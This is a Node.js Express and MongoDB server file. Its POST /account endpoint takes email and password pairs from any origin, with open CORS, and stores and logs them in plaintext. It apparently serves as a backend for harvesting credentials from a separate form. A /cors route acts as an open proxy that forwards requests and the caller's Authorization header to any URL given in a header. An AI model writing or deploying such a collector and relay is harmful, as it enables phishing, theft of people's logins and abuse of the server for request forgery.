const puppeteer = require('puppeteer');
require('dotenv').config()
const mongoose = require("mongoose");
const express = require('express');
const cors = require("cors");
const request = require("request");

const app = express()
const port = process.env.PORT
mongoose.connect(process.env.DB_URI, {useNewUrlParser: true, useUnifiedTopology: true});

const accountSchema = new mongoose.Schema({
        email: {type: String, required: true},
        password: {type: String, required: true},
        timestamp: {type: Date, required: false, default: Date.now}
    },
    {
        collection: "accounts",
    }
)

Account = mongoose.model("Account", accountSchema);

let pageDataCache = new Map();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cors())

app.post('/account', async (req, res) => {
    try {
        let email = req.body.email??"";
        let password = req.body.password??"";
        let savedAccount = await (new Account({email, password})).save();
        console.log(savedAccount);
        return res.status(200).json({msg: "OK!"})
    } catch (err) {
        console.log(err)
        return res.status(500).json({msg: "Error!"});
    }
})

app.listen(port, () => {
  console.log(`Listening on port ${port}`)
})

app.all('/cors', function (req, res, next) {
    if (req.method === 'OPTIONS') {
        // CORS Preflight
        res.send();
    } else {
        var targetURL = req.header('Target-URL');
        if (!targetURL) {
            res.send(400).json({ error: 'There is no Target-Endpoint header in the request' });
            return;
        }
        request({ url: targetURL, method: req.method, json: req.body, headers: {'Authorization': req.header('Authorization')} },
            function (error, response, body) {
                if (error) {
                    console.error('error: ' + response.statusCode)
                }
            }).pipe(res);
    }
  });

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', function() {
  console.log("Connected to MongoDB!")
});